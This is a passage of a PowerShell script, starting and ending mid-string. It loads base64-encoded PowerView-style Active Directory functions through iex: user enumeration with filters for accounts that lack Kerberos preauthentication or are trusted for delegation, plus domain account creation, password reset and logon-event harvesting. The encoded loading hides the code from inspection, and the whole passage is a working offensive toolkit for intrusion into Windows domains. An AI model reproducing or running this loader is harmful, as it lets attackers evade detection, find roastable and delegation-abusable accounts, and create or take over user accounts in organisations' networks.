aXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluVXNlcl0gU2VhcmNoaW5nIGZvciB1c2VycyB3aG8gYXJlIHNlbnNpdGl2ZSBhbmQgbm90IHRydXN0ZWQgZm9yIGRlbGVnYXRpb24nCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0FkbWluQ291bnQnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIGFkbWluQ291bnQ9MScKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gJyhhZG1pbmNvdW50PTEpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RydXN0ZWRUb0F1dGgnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHRoYXQgYXJlIHRydXN0ZWQgdG8gYXV0aGVudGljYXRlIGZvciBvdGhlciBwcmluY2lwYWxzJwogICAgICAgICAgICAgICAgJEZpbHRlciArPSAnKG1zZHMtYWxsb3dlZHRvZGVsZWdhdGV0bz0qKScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydQcmVhdXRoTm90UmVxdWlyZWQnXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXIgYWNjb3VudHMgdGhhdCBkbyBub3QgcmVxdWlyZSBrZXJiZXJvcyBwcmVhdXRoZW50aWNhdGUnCiAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICcodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTQxOTQzMDQpJwogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5Vc2VyXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlciIKICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRVQUNGaWx0ZXIgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ05PVF8uKicpIHsKICAgICAgICAgICAgICAgICAgICAkVUFDRmllbGQgPSAkXy5TdWJzdHJpbmcoNCkKICAgICAgICAgICAgICAgICAgICAkVUFDVmFsdWUgPSBbSW50XSgkVUFDRW51bTo6JFVBQ0ZpZWxkKQogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIighKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUpKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICRVQUNWYWx1ZSA9IFtJbnRdKCRVQUNFbnVtOjokXykKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFVzZXJTZWFyY2hlci5maWx0ZXIgPSAiKCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSRGaWx0ZXIpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIGZpbHRlciBzdHJpbmc6ICQoJFVzZXJTZWFyY2hlci5maWx0ZXIpIgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkVXNlclNlYXJjaGVyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRVc2VyU2VhcmNoZXIuRmluZEFsbCgpIH0KICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1JhdyddKSB7CiAgICAgICAgICAgICAgICAgICAgJFVzZXIgPSAkXwogICAgICAgICAgICAgICAgICAgICRVc2VyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Vc2VyLlJhdycpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkVXNlciA9IENvbnZlcnQtTERBUFByb3BlcnR5IC1Qcm9wZXJ0aWVzICRfLlByb3BlcnRpZXMKICAgICAgICAgICAgICAgICAgICAkVXNlci5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuVXNlcicpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkVXNlcgogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblVzZXJdIEVycm9yIGRpc3Bvc2luZyBvZiB0aGUgUmVzdWx0cyBvYmplY3Q6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgICRVc2VyU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LURvbWFpblVzZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlU2hvdWxkUHJvY2Vzc0ZvclN0YXRlQ2hhbmdpbmdGdW5jdGlvbnMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ0RpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlVzZXJQcmluY2lwYWwnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZUxlbmd0aCgwLCAyNTYpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNhbUFjY291bnROYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdQYXNzd29yZCcpXQogICAgICAgIFtTZWN1cml0eS5TZWN1cmVTdHJpbmddCiAgICAgICAgJEFjY291bnRQYXNzd29yZCwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE5hbWUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREaXNwbGF5TmFtZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERlc2NyaXB0aW9uLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJENvbnRleHRBcmd1bWVudHMgPSBAewogICAgICAgICdJZGVudGl0eScgPSAkU2FtQWNjb3VudE5hbWUKICAgIH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICBpZiAoJENvbnRleHQpIHsKICAgICAgICAkVXNlciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudC5Vc2VyUHJpbmNpcGFsIC1Bcmd1bWVudExpc3QgKCRDb250ZXh0LkNvbnRleHQpCiAgICAgICAgJFVzZXIuU2FtQWNjb3VudE5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgICRUZW1wQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ2EnLCAkQWNjb3VudFBhc3N3b3JkKQogICAgICAgICRVc2VyLlNldFBhc3N3b3JkKCRUZW1wQ3JlZC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICRVc2VyLkVuYWJsZWQgPSAkVHJ1ZQogICAgICAgICRVc2VyLlBhc3N3b3JkTm90UmVxdWlyZWQgPSAkRmFsc2UKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydOYW1lJ10pIHsKICAgICAgICAgICAgJFVzZXIuTmFtZSA9ICROYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkVXNlci5OYW1lID0gJENvbnRleHQuSWRlbnRpdHkKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGlzcGxheU5hbWUnXSkgewogICAgICAgICAgICAkVXNlci5EaXNwbGF5TmFtZSA9ICREaXNwbGF5TmFtZQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJFVzZXIuRGlzcGxheU5hbWUgPSAkQ29udGV4dC5JZGVudGl0eQogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZXNjcmlwdGlvbiddKSB7CiAgICAgICAgICAgICRVc2VyLkRlc2NyaXB0aW9uID0gJERlc2NyaXB0aW9uCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltOZXctRG9tYWluVXNlcl0gQXR0ZW1wdGluZyB0byBjcmVhdGUgdXNlciAnJFNhbUFjY291bnROYW1lJyIKICAgICAgICB0cnkgewogICAgICAgICAgICAkTnVsbCA9ICRVc2VyLlNhdmUoKQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbTmV3LURvbWFpblVzZXJdIFVzZXIgJyRTYW1BY2NvdW50TmFtZScgc3VjY2Vzc2Z1bGx5IGNyZWF0ZWQiCiAgICAgICAgICAgICRVc2VyCiAgICAgICAgfQogICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW05ldy1Eb21haW5Vc2VyXSBFcnJvciBjcmVhdGluZyB1c2VyICckU2FtQWNjb3VudE5hbWUnIDogJF8iCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gU2V0LURvbWFpblVzZXJQYXNzd29yZCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VTaG91bGRQcm9jZXNzRm9yU3RhdGVDaGFuZ2luZ0Z1bmN0aW9ucycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZSgnRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ1VzZXJOYW1lJywgJ1VzZXJJZGVudGl0eScsICdVc2VyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkSWRlbnRpdHksCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ1Bhc3N3b3JkJyldCiAgICAgICAgW1NlY3VyaXR5LlNlY3VyZVN0cmluZ10KICAgICAgICAkQWNjb3VudFBhc3N3b3JkLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgJENvbnRleHRBcmd1bWVudHMgPSBAeyAnSWRlbnRpdHknID0gJElkZW50aXR5IH0KICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb250ZXh0QXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb250ZXh0QXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAkQ29udGV4dCA9IEdldC1QcmluY2lwYWxDb250ZXh0IEBDb250ZXh0QXJndW1lbnRzCiAgICBpZiAoJENvbnRleHQpIHsKICAgICAgICAkVXNlciA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWNjb3VudE1hbmFnZW1lbnQuVXNlclByaW5jaXBhbF06OkZpbmRCeUlkZW50aXR5KCRDb250ZXh0LkNvbnRleHQsICRJZGVudGl0eSkKICAgICAgICBpZiAoJFVzZXIpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIEF0dGVtcHRpbmcgdG8gc2V0IHRoZSBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5JyIKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRUZW1wQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ2EnLCAkQWNjb3VudFBhc3N3b3JkKQogICAgICAgICAgICAgICAgJFVzZXIuU2V0UGFzc3dvcmQoJFRlbXBDcmVkLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRVc2VyLlNhdmUoKQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIHN1Y2Nlc3NmdWxseSByZXNldCIKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gRXJyb3Igc2V0dGluZyBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5JyA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbU2V0LURvbWFpblVzZXJQYXNzd29yZF0gVW5hYmxlIHRvIGZpbmQgdXNlciAnJElkZW50aXR5JyIKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpblVzZXJFdmVudCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uRXZlbnQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ2Ruc2hvc3RuYW1lJywgJ0hvc3ROYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJEVudjpDT01QVVRFUk5BTUUsCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJFN0YXJ0VGltZSA9IFtEYXRlVGltZV06Ok5vdy5BZGREYXlzKC0xKSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkRW5kVGltZSA9IFtEYXRlVGltZV06Ok5vdywKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRNYXhFdmVudHMgPSA1MDAwLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgQkVHSU4gewogICAgICAgICRYUGF0aEZpbHRlciA9IEAiCjxRdWVyeUxpc3Q+CiAgICA8UXVlcnkgSWQ9IjAiIFBhdGg9IlNlY3VyaXR5Ij4KICAgICAgICA8IS0tIExvZ29uIGV2ZW50cyAtLT4KICAgICAgICA8U2VsZWN0IFBhdGg9IlNlY3VyaXR5Ij4KICAgICAgICAgICAgKlsKICAgICAgICAgICAgICAgIFN5c3RlbVsKICAgICAgICAgICAgICAgICAgICBQcm92aWRlclsKICAgICAgICAgICAgICAgICAgICAgICAgQE5hbWU9J01pY3Jvc29mdC1XaW5kb3dzLVNlY3VyaXR5LUF1ZGl0aW5nJwogICAgICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgICAgICAgICBhbmQgKExldmVsPTQgb3IgTGV2ZWw9MCkgYW5kIChFdmVudElEPTQ2MjQpCiAgICAgICAgICAgICAgICAgICAgYW5kIFRpbWVDcmVhdGVkWwogICAgICAgICAgICAgICAgICAgICAgICBAU3lzdGVtVGltZSZndDs9JyQoJFN0YXJ0VGltZS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygncycpKScgYW5kIEBTeXN0ZW1UaW1lJmx0Oz0nJCgkRW5kVGltZS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygncycpKScKICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgIF0KICAgICAgICAgICAgYW5kCiAgICAgICAgICAgICpbRXZlbnREYXRhW0RhdGFbQE5hbWU9J1RhcmdldFVzZXJOYW1lJ10gIT0gJ0FOT05ZTU9VUyBMT0dPTiddXQogICAgICAgIDwvU2VsZWN0PgogICAgICAgIDwhLS0gTG9nb24gd2l0aCBleHBsaWNpdCBjcmVkZW50aWFsIGV2ZW50cyAtLT4KICAgICAgICA8U2VsZWN0IFBhdGg9IlNlY3VyaXR5Ij4KICAgICAgICAgICAgKlsKICAgICAgICAgICAgICAgIFN5c3RlbVsKICAgICAgICAgICAgICAgICAgICBQcm92aWRlclsKICAgICAgICAgICAgICAgICAgICAgICAgQE5hbWU9J01pY3Jvc29mdC1XaW5kb3dzLVNlY3VyaXR5LUF1ZGl0aW5nJwogICAgICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgICAgICAgICBhbmQgKExldmVsPTQgb3IgTGV2ZWw9MCkgYW5kIChFdmVudElEPTQ2NDgpCiAgICAgICAgICAgICAgICAgICAgYW5kIFRpbWVDcmVhdGVkWwogICAgICAgICAgICAgICAgICAgICAgICBAU3lzdGVtVGltZSZndDs9JyQoJFN0YXJ0VGltZS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygncycpKScgYW5kIEBTeXN0ZW1UaW1lJmx0Oz0nJCgkRW5kVGltZS5Ub1VuaXZlcnNhbFRpbWUoKS5Ub1N0cmluZygncycpKScKICAgICAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgIF0KICAgICAgICA8L1NlbGVjdD4KICAgICAgICA8U3VwcHJlc3MgUGF0aD0iU2VjdXJpdHkiPgogICAgICAgICAgICAqWwogICAgICAgICAgICAgICAgU3lzdGVtWwogICAgICAgICAgICAgICAgICAgIFByb3ZpZGVyWwogICAgICAgICAgICAgICAgICAgICAgICBATmFtZT0nTWljcm9zb2Z0LVdpbmRvd3MtU2VjdXJpdHktQXVkaXRpbmcnCiAgICAgICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgICAgIGFuZAogICAgICAgICAgICAgICAgICAgIChMZXZlbD00IG9yIExldmVsPTApIGFuZCAoRXZlbnRJRD00NjI0IG9yIEV2ZW50SUQ9NDYyNSBvciBFdmVudElEPTQ2MzQpCiAgICAgICAgICAgICAgICBdCiAgICAgICAgICAgIF0KICAgICAgICAgICAgYW5kCiAgICAgICAgICAgICpbCiAgICAgICAgICAgICAgICBFdmVudERhdGFbCiAgICAgICAgICAgICAgICAgICAgKAogICAgICAgICAgICAgICAgICAgICAgICAoRGF0YVtATmFtZT0nTG9nb25UeXBlJ109JzUnIG9yIERhdGFbQE5hbWU9J0xvZ29uVHlwZSddPScwJykKICAgICAgICAgICAgICAgICAgICAgICAgb3IKICAgICAgICAgICAgICAgICAgICAgICAgRGF0YVtATmFtZT0nVGFyZ2V0VXNlck5hbWUnXT0nQU5PTllNT1VTIExPR09OJwogICAgICAgICAgICAgICAgICAgICAgICBvcgogICAgICAgICAgICAgICAgICAgICAgICBEYXRhW0BOYW1lPSdUYXJnZXRVc2VyU0lEJ109J1MtMS01LTE4JwogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIF0KICAgICAgICAgICAgXQogICAgICAgIDwvU3VwcHJlc3M+CiAgICA8L1F1ZXJ5Pgo8L1F1ZXJ5TGlzdD4KIkAKICAgICAgICAkRXZlbnRBcmd1bWVudHMgPSBAewogICAgICAgICAgICAnRmlsdGVyWFBhdGgnID0gJFhQYXRoRmlsdGVyCiAgICAgICAgICAgICdMb2dOYW1lJyA9ICdTZWN1cml0eScKICAgICAgICAgICAgJ01heEV2ZW50cycgPSAkTWF4RXZlbnRzCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkRXZlbnRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICRFdmVudEFyZ3VtZW50c1snQ29tcHV0ZXJOYW1lJ10gPSAkQ29tcHV0ZXIKICAgICAgICAgICAgR2V0LVdpbkV2ZW50IEBFdmVudEFyZ3VtZW50c3wgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgJEV2ZW50ID0gJF8KICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJEV2ZW50LlByb3BlcnRpZXMKICAgICAgICAgICAgICAgIFN3aXRjaCAoJEV2ZW50LklkKSB7CiAgICAgICAgICAgICAgICAgICAgNDYyNCB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKC1ub3QgJFByb3BlcnRpZXNbNV0uVmFsdWUuRW5kc1dpdGgoJyQnKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dHB1dCA9IE5ldy1PYmplY3QgUFNPYmplY3QgLVByb3BlcnR5IEB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29tcHV0ZXJOYW1lICAgICAgICAgICAgICA9ICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRpbWVDcmVhdGVkICAgICAgICAgICAgICAgPSAkRXZlbnQuVGltZUNyZWF0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFdmVudElkICAgICAgICAgICAgICAgICAgID0gJEV2ZW50LklkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3ViamVjdFVzZXJTaWQgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzBdLlZhbHVlLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0VXNlck5hbWUgICAgICAgICAgID0gJFByb3BlcnRpZXNbMV0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0RG9tYWluTmFtZSAgICAgICAgID0gJFByb3BlcnRpZXNbMl0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTdWJqZWN0TG9nb25JZCAgICAgICAgICAgID0gJFByb3BlcnRpZXNbM10uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUYXJnZXRVc2VyU2lkICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbNF0uVmFsdWUuVG9TdHJpbmcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldFVzZXJOYW1lICAgICAgICAgICAgPSAkUHJvcGVydGllc1s1XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldERvbWFpbk5hbWUgICAgICAgICAgPSAkUHJvcGVydGllc1s2XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRhcmdldExvZ29uSWQgICAgICAgICAgICAgPSAkUHJvcGVydGllc1s3XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvZ29uVHlwZSAgICAgICAgICAgICAgICAgPSAkUHJvcGVydGllc1s4XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIExvZ29uUHJvY2Vzc05hbWUgICAgICAgICAgPSAkUHJvcGVydGllc1s5XS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dGhlbnRpY2F0aW9uUGFja2FnZU5hbWUgPSAkUHJvcGVydGllc1sxMF0uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXb3Jrc3RhdGlvbk5hbWUgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTFdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTG9nb25HdWlkICAgICAgICAgICAgICAgICA9ICRQcm9wZXJ0aWVzWzEyXS5WYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYW5zbWl0dGVkU2VydmljZXMgICAgICAgPSAkUHJvcGVydGllc1sxM10uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBMbVBhY2thZ2VOYW1lICAgICAgICAgICAgID0gJFByb3BlcnRpZXNbMTRdLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgIC